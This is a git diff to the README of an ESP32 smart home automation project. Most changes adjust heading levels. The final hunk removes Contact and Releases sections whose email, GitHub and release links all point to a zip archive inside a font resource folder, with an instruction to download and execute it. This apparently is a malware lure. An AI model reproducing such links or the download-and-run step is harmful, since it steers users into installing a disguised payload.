@@ -60,7 +60,7 @@ To get started with the IoT Smart Home Automation project, follow these steps:
 5. **Connect Your Devices**:
    Follow the wiring diagrams provided in the repository to connect your appliances and sensors to the ESP32.
 
-## Usage
+# Usage
 
 Once you have installed the project, you can start using it:
 
@@ -69,7 +69,7 @@ Once you have installed the project, you can start using it:
 3. **Monitor Status**: Check the status of each appliance in real-time.
 4. **Access Cloud Features**: Use cloud services for remote access and monitoring.
 
-## Contributing
+# Contributing
 
 We welcome contributions to improve this project. If you have suggestions or want to add features, please follow these steps:
 
@@ -85,18 +85,9 @@ Please ensure your code adheres to the existing style and includes tests where a
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Contact
 
-For any inquiries or feedback, feel free to reach out:
 
-- **Email**: https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip
-- **GitHub**: [Polarssj](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip)
 
-## Releases
-
-You can find the latest releases of the project [here](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip). Download the necessary files and execute them to set up the project.
-
-![Releases](https://raw.githubusercontent.com/Polarssj/Iot-smart-home-automation/main/AndroidApp/res/font/automation-home-smart-Iot-v1.3.zip)
 
 For further updates, please check the **Releases** section regularly.
 
